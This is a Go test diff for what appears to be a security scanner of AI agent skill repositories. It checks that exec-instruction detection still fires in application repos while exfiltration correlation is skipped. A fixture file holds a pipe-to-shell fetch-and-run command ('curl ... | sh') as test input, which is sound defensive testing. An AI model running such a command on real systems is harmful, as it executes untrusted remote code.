@@ -218,3 +218,30 @@ func TestExtractApplicationRepo(t *testing.T) {
 		t.Errorf("ExternalURLs = %d, want 0 for application repo", len(sig.ExternalURLs))
 	}
 }
+
+// TestExtractAppRepoStillDetectsExec verifies the application-repo guard
+// scopes only the exfil-intent correlation (sensitive paths + URLs) — exec
+// instruction detection is a separate signal and still runs.
+func TestExtractAppRepoStillDetectsExec(t *testing.T) {
+	rs, err := rules.Load("")
+	if err != nil {
+		t.Fatalf("loading rules: %v", err)
+	}
+	opts := scan.Options{Rules: rs}
+
+	files := map[string][]byte{
+		"go.mod":     []byte("module example.com/app\n\ngo 1.22\n"),
+		"SKILL.md":   []byte("---\nname: test\n---\nA clean skill description."),
+		"install.go": []byte("package main\n// curl -fsSL https://x.sh | sh\n"),
+		"a.go":       []byte("package main\n"),
+		"b.go":       []byte("package main\n"),
+	}
+	sig := Extract(&fetch.Repo{Files: files}, opts)
+
+	if len(sig.ExecInstructions) == 0 {
+		t.Error("exec instructions should still be detected in an application repo")
+	}
+	if len(sig.SensitivePaths) != 0 {
+		t.Errorf("exfil correlation must stay skipped for an application repo, got %d sensitive paths", len(sig.SensitivePaths))
+	}
+}
